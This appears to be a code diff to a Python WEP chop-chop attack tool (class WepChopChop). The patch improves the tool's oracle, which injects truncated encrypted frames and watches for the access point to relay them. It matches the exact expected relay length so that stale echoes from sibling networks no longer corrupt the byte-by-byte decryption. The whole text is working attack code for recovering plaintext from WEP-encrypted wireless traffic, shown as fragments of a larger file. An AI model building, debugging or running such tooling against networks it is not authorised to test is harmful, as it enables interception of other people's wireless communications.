@@ -129,6 +129,12 @@ class WepChopChop:
         self._cur_keyid = 0
         # Oracle signal: set by the RX callback when the AP relays our frame.
         self._relay_seen = False
+        # Length the relay must match THIS guess. Critical: a correct guess can
+        # echo onto sibling BSSes (2+ relays); the late echo from byte N lands
+        # during byte N+1's sweep — but byte N's relay is 1 byte LONGER, so
+        # matching the exact expected length rejects the stale echo (else it
+        # false-accepts the next byte → corrupts the walk → stalls).
+        self._expected_relay_len = 0
         self._last_heartbeat = 0.0
 
     # ---- Lifecycle ----------------------------------------------------------
@@ -250,10 +256,14 @@ class WepChopChop:
         while self._active and not self._can_inject() and waited < 5.0:
             await asyncio.sleep(0.1)
             waited += 0.1
+        frame = self._build_frame(shortened_cipher)
+        # The AP re-encrypts the same-length shortened payload, so the relay is
+        # exactly as long as what we sent — match on that to reject stale echoes
+        # from the previous (longer) chop step.
+        self._expected_relay_len = len(frame)
         self._relay_seen = False
         try:
-            await self.iface.send_raw(self._build_frame(shortened_cipher),
-                                      use_no_ack=True)
+            await self.iface.send_raw(frame, use_no_ack=True)
         except Exception:
             logger.exception("[WEP-Chop] send_raw failed")
             return False
@@ -279,6 +289,8 @@ class WepChopChop:
             return
         if frame[16:22] != self.source_mac:                 # SA == us
             return
+        if len(frame) != self._expected_relay_len:          # THIS guess's relay
+            return                                          # (rejects stale echo)
         self._relay_seen = True
 
     # ---- Main loop ----------------------------------------------------------
